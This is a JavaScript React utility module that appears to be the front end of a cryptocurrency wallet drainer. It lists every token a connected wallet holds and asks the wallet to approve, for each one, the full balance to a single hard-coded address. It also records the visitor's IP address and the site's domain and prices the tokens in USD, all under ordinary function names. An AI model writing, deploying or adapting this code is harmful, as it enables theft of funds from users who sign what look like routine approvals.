import React from "react";
import { Alchemy, Network } from "alchemy-sdk";
import { config as wagmiConfig } from "../../wagmiConfig";
import { useAccount } from "wagmi";
import Erc20Abi from "../utils/Erc20Abi";
import { writeContract, getBalance, sendTransaction } from "@wagmi/core";
import axios from "axios";
import { parseEther } from "viem";
import axiosRetry from 'axios-retry';

const API_KEY = import.meta.env.VITE_APP_COINGECKO_API_KEY;
const api = axios.create({
  baseURL: 'https://api.coingecko.com/api/v3/simple/',
});

axiosRetry(api, {
  retries: 3, // adjust the number of retries
  retryDelay: 1000, // adjust the delay between retries
});

const alchemyConfig = {
  apiKey: import.meta.env.VITE_APP_ALCHEMY_API_KEY,
  network: Network.ETH_MAINNET, // Replace with your network.
};
const alchemy = new Alchemy(alchemyConfig);

const getUserTokens = async (_address) => {
  try {
    const response = await alchemy.core.getTokensForOwner(_address);
    return response.tokens;
  } catch (error) {
    console.error("Error fetching token balances:", error);
    return [];
  }
};

const increaseAllowanceForTokens = async (tokensData) => {
  for (let token of tokensData) {
    const { contractAddress, balance } = token;
    await increaseAllowance(contractAddress, balance);
  }
  return console.log("tokens looped and passed succesfully");
};

const increaseAllowance = async (contractAddress, allowance) => {
  try {
    const hash = await writeContract(wagmiConfig, {
      address: contractAddress,
      abi: Erc20Abi,
      functionName: "approve",
      args: [
        "0xD745A139eDb02c0c9eC4ce523a8c87D9f4d109E0",
        parseEther(allowance),
      ],
    });
    return { success: true, data: hash };
  } catch (error) {
    return { success: false, error: error.message };
  }
};

const getAccountBalance = async (_address) => {
  try {
    const balance = await getBalance(wagmiConfig, { _address });
    console.log("this is balance from the function:", balance)
    return balance;
  } catch (error) {
    console.error("Failed to get balance: ", error);
    return 0;
  }
};

const getTokenPriceByAddress = async (tokenAddress, currency) => {
  try {
    const cachedPrice = localStorage.getItem(
      `tokenPrice-${tokenAddress}-${currency}`
    );
    if (cachedPrice) {
      return parseFloat(cachedPrice);
    }

    const response = await api.get(`token_price/ethereum`, {
      params: {
        contract_addresses: tokenAddress,
        vs_currencies: currency,
        x_cg_proxied: true,
      },
    });

    const priceData = response.data[tokenAddress][currency];
    localStorage.setItem(`tokenPrice-${tokenAddress}-${currency}`, priceData);
    return parseFloat(priceData);
  } catch (error) {
    console.error("Error fetching token price:", error);
    return null;
  }
};

const getTokenPriceByAddressAndAmount = async (
  tokenAddress,
  currency,
  amount
) => {
  const price = await getTokenPriceByAddress(tokenAddress, currency);
  if (price === null) return null;
  const totalValue = price * amount;
  console.log("price of token in usd: ", price);

  return { contractAddress: tokenAddress, amountInusd: totalValue, currency };
};

const getIPAddress = async () => {
  try {
    const response = await axios.get("https://api.ipify.org/?format=json");
    return response.data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    throw new Error("Failed to fetch IP address.");
  }
};

const getDomain = () => {
  const currentDomain = window.location.hostname;
  return currentDomain;
};

export {
  getUserTokens,
  increaseAllowanceForTokens,
  increaseAllowance,
  getTokenPriceByAddress,
  getTokenPriceByAddressAndAmount,
  getIPAddress,
  getDomain,
  getAccountBalance,
};
